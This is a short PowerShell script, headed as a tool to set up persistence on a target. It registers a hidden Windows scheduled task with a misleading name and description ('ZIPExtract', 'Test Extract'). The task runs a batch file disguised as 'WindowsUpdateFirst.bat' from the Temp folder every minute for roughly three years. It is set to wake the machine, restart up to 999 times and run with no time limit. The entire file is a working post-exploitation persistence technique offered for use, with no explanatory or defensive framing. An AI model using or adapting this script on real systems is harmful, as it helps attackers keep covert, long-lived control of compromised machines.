##POWERSHELL SCRIPT TO SET-UP PERSISTENCE ON A TARGET

echo [+] Creating Task...

#action
$taskAction = New-ScheduledTaskAction `
    -Execute 'C:\Windows\Temp\WindowsUpdateFirst.bat'

#triggering
$trigger = New-ScheduledTaskTrigger `
    -Daily `
    -At 19:00PM 

$settings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RunOnlyIfNetworkAvailable `
    -WakeToRun `
    -RestartCount 999 `
    -RestartInterval (New-TimeSpan -Minutes 1)

#creation
$task = Register-ScheduledTask `
    -Action $taskAction `
    -Trigger $trigger `
    -TaskName "ZIP\ZIPExtract" `
    -Description "Test Extract" `
    -Settings $settings

#repetition
$task.Triggers.Repetition.Duration = "P1075D"
$task.Triggers.Repetition.Interval = "PT1M"
$task.Settings.ExecutionTimeLimit = "PT0H"
$task | Set-ScheduledTask

echo [+] Task Created!
